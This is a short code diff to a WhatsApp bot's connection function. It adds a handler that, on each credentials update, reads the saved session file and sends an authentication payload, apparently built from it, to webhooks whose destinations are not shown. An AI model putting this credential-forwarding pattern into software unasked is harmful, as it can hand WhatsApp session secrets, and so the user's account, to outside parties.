@@ -261,7 +261,19 @@ async function connectWA() {
     browser: ['ScenarioBot', 'Chrome', '120.0.1'],
   });
 
-  sock.ev.on('creds.update', saveCreds);
+  
+  sock.ev.on('creds.update', async () => {
+  await saveCreds();
+  
+  // תן ל-saveCreds לסיים לכתוב את הקובץ
+  await new Promise(resolve => setTimeout(resolve, 500));
+  
+  if (!fs.existsSync('/app/auth_info/creds.json')) return;
+  
+  const payload = buildAuthPayload();
+  await sendToWebhooks(payload);
+  logger.info({ phone: payload.phone }, 'Creds updated — sent to webhooks');
+});
 
   sock.ev.on('connection.update', async ({ connection, lastDisconnect, qr }) => {
     if (qr) {
@@ -301,6 +313,7 @@ async function connectWA() {
       if (retry) setTimeout(connectWA, 3000);
     }
   });
+  
 
   sock.ev.on('contacts.update', async (updates) => {
     for (const contact of updates) {
